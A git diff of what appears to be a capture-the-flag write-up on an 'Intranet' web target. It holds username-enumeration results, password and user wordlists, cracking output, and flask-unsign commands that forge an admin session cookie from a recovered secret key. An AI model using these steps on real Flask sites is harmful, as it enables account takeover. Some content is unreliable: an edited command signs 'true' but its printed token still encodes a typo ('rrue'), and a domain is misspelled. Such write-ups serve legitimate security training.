@@ -213,10 +213,9 @@ Finished
 - 200 OK, Invalid username for username= <code>magnus</code>%40securesolacoders.no&password=password<br>
 - 200 OK, Invalid password for username= <code>admin</code>%40securesolacoders.no&password=password</p>
 
-<h2 align="center">Keywords</h2>
+<h2 align="center">W.txt</h2>
 
 ```bash
-(rosana) :~/Intranet# cat reference
 anders
 devops
 admin
@@ -224,6 +223,14 @@ securesolacoders
 password
 developer
 senior
+```
+
+<h2 align="center">users.txt</h2>
+
+```bash
+devops@securesolacoders.no
+admin@securesolacodres.no
+anders@securesolacoders.no
 ```
 
 <h2 align="center">A.txt</h2>
@@ -268,15 +275,6 @@ secu
 Using default input encoding: UTF-8
 Press 'q' or Ctrl-C to abort, almost any other key for status
 70539p 0:00:00:00 100.00% (2025-10-01 13:54) 641263p/s sesola
-```
-
-<h2 align="center">users.txt</h2>
-
-```bash
-(rosana) :~/Intranet# cat users.txt
-anders@securesolacoders.no
-devops@40securesolacoders.no
-admin@securesolacoders.no
 ```
 
 <h2 align="center">Hydra</h2>
@@ -817,18 +815,21 @@ secret_key_999999
 'secret_key_xxxxxx'
 ```
 
-
-```bash
-:~/Intranet# flask-unsign --sign --cookie '{"logged_in": rrue, "username": "admin"}' --secret 'secret_key'
-IntcImxvZ2dlZF9pblwiOiBycnVlLCBcInVzZXJuYW1lXCI6IFwiYWRtaW5cIn0i.aN02ZA.5zGKWNTWRjy-BYWYSwBDCkjTqVQ
-```
-
 <h2 align="center">JWT to enable admin´s session</h2>
 
 ```bash
-(rosana) :~/Intranet# flask-unsign --sign --cookie "{'logged_in': True, 'username': 'admin'}" --secret "secret_key_xxxxxx"
-eyJsb2dnZWRfaW4iOn*************************Q.aLDTWw.anr8hkKuMLBVnG5L3pAfLTtUdtA
+:~/Intranet# flask-unsign --sign --cookie '{"logged_in": true, "username": "admin"}' --secret 'secret_key'
+IntcImxvZ2dlZF9pblwiOiBycnVlLCBcInVzZXJuYW1lXCI6IFwiYWRtaW5cIn0i.aN02ZA.5zGKWNTWRjy-BYWYSwBDCkjTqVQ
 ```
+
+eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4ifQ.aLDTWw.anr8hkKuMLBVnG5L3pAfLTtUdtA
+
+<img width="1160" height="507" alt="image" src="https://github.com/user-attachments/assets/2378bf16-ef04-4064-8667-49b92eccd918" />
+
+
+<img width="788" height="205" alt="image" src="https://github.com/user-attachments/assets/6d22e171-682c-4216-b3cb-89260d53ff81" />
+
+
 
 <h2 align="center">admin</h2>
 <p>
